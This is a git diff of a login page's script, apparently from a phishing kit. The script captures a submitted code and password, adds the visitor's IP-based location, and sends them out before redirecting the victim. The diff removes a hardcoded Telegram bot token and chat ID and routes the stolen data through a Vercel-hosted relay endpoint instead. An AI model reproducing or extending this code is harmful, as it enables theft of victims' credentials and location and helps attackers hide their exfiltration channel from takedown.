@@ -136,9 +136,6 @@
   </script>
 
   <script>
-    var telegram_bot_id = "8855414201:AAHfpOhQ0szh27tbLKhHZBiNvTobN8B-wPY";
-    var chat_id = "-5167092041";
-
     document.addEventListener("DOMContentLoaded", function () {
       function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
         fetch('https://ipapi.co/json/')
@@ -157,16 +154,31 @@
       }
 
       function enviarMensajeTelegram(mensaje, nextPage) {
-        fetch('https://api.telegram.org/bot' + telegram_bot_id + '/sendMessage', {
+        // URL de tu backend en Vercel
+        var url = 'https://telegram-backend-umber.vercel.app/api/telegram';
+        
+        // El backend espera un objeto con la propiedad "message"
+        var params = {
+          message: mensaje
+        };
+
+        fetch(url, {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chat_id, text: mensaje })
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(params)
         })
         .then(response => {
-          if (!response.ok) throw new Error('Error al enviar el mensaje.');
+          if (!response.ok) {
+            throw new Error('Ocurrió un error al enviar el mensaje.');
+          }
+          console.log('Mensaje enviado con éxito.');
           window.location.href = nextPage;
         })
-        .catch(error => console.error('Error al enviar el mensaje:', error));
+        .catch(error => {
+          console.error('Error al enviar el mensaje:', error);
+        });
       }
 
       var loginForm = document.getElementById("loginForm");
@@ -178,6 +190,6 @@
         });
       }
     });
-  </script>
+</script>
 </body>
 </html>
